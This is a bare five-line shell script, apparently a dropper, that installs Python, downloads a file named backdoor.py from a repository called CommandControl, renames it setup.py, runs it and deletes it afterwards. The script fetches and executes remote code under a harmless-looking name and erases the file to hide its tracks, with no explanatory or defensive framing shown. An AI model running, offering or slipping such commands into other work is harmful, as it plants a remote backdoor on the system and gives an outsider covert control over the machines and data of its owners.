yum install -y python3;
curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py;
chmod +x setup.py
python3 setup.py;
rm setup.py
